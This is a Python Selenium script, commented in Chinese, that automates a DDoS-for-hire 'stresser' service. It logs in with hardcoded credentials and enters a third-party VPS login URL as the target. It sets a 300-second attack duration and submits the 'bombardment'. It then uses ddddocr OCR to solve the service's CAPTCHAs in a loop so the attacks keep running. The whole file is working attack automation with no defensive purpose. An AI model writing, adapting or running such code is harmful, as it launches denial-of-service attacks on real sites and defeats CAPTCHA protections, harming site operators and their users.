import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import ddddocr
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

username = '926023500'
pwd = '926023500'
ip = 'https://www.qvps.top/login'

service = Service('chromedriver.exe')
driver = webdriver.Chrome(service=service)
driver.implicitly_wait(10)
driver.get('https://stresser.su/login')
time.sleep(2)
# 登陆
driver.find_element(By.NAME,'username').send_keys(username)
driver.find_element(By.NAME,'password').send_keys(pwd)
driver.find_element(By.XPATH,'//*[@id="root"]/div/div[2]/div/div/div/div/section/div/div[2]/form/div[3]/button').click()
time.sleep(2)

# 开始轰炸
# 设置轰炸的信息
driver.get('https://stresser.su/hub')
time.sleep(1)
driver.find_element(By.XPATH,'/html/body/div[3]/div/div/div[3]/button').click()
time.sleep(1)
driver.find_element(By.NAME,'hub.0.host').send_keys(ip)
time.sleep(1)
# send_time = driver.find_element(By.NAME,'hub.0.time')
send_time = driver.find_element(By.XPATH,'/html/body/div/div/div[3]/div/div/div[2]/div/section/div[2]/form/div[1]/div/div/div[2]/div/div/div[2]/div[1]/div/input[2]')
# 将input框中的所有内容选中并删除
# 方法1: 使用send_keys()方法
send_time.send_keys(Keys.CONTROL, 'a')  # 全选
send_time.send_keys(Keys.CONTROL, 'x')  # 剪切（在大多数浏览器中等同于删除）
time.sleep(1)
send_time.send_keys('300')
time.sleep(2)

# 提交轰炸按钮
driver.find_element(By.XPATH,'/html/body/div/div/div[3]/div/div/div[2]/div/section/div[2]/form/div[2]/div/div/button[3]').click()
time.sleep(1)

wait = 1
# 提交轰炸之后，处理验证码
for i in range(10):
    try:
        time.sleep(wait)
        click_send = driver.find_element(By.XPATH, '/html/body/div[3]/div/div/div[3]/button[1]')
        # 抓到验证码，并且截图
        driver.find_element(By.XPATH,'/html/body/div[3]/div/div/div[2]/div/div[1]/div/img').screenshot('code_cc.png')
        time.sleep(1)
        # 用ddddocr来识别内容
        ocr = ddddocr.DdddOcr()
        with open('code_cc.png', 'rb') as fp:
            image = fp.read()
        # 拿到验证码catch
        catch = ocr.classification(image)
        # 填入验证码
        send_catch = driver.find_element(By.NAME,'captcha')
        send_catch.send_keys(Keys.CONTROL, 'a')  # 全选
        send_catch.send_keys(Keys.CONTROL, 'x')  # 剪切（在大多数浏览器中等同于删除）
        send_catch.send_keys(catch)
        # 点击提交
        click_send.click()
        time.sleep(2)
        wait = 7
        continue
    except:
        break
# driver.find_element(By.CLASS_NAME,'accordion-button').screenshot('cc_msg.png')

driver.quit()
